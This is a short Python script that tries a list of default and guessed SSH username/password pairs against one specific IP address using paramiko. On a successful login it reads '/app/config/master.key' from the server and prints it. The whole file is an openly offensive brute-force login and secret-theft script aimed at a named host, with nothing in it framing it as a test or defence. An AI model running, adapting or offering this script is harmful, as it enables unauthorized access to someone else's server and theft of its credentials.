#!/usr/bin/env python3
"""Try SSH to 38.107.234.149 with known credentials"""
import paramiko
import sys

HOST = "38.107.234.149"
PORT = 22

users_passwords = [
    ("root", "changeme"),
    ("root", "lago"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "password"),
    ("root", ""),
    ("lago", "changeme"),
    ("lago", "lago"),
    ("lago", "Lago"),
    ("lago", "password"),
    ("ubuntu", "changeme"),
    ("ubuntu", "ubuntu"),
    ("ubuntu", "password"),
    ("deploy", "changeme"),
    ("deploy", "deploy"),
    ("admin", "changeme"),
    ("admin", "admin"),
    ("admin", "password"),
    ("administrator", "changeme"),
    ("administrator", "password"),
    ("vlad", "changeme"),
    ("vlad", "password"),
    ("vladislav", "changeme"),
]

for user, pw in users_passwords:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(HOST, PORT, username=user, password=pw, timeout=5)
        print("SSH SUCCESS: {} : {}".format(user, pw))
        stdin, stdout, stderr = client.exec_command("cat /app/config/master.key")
        key = stdout.read().decode().strip()
        print("MASTER KEY:", key)
        client.close()
        sys.exit(0)
    except paramiko.AuthenticationException:
        pass
    except Exception as e:
        print("Error {}:{} - {}".format(user, pw, e))
    finally:
        client.close()

print("No SSH access found")
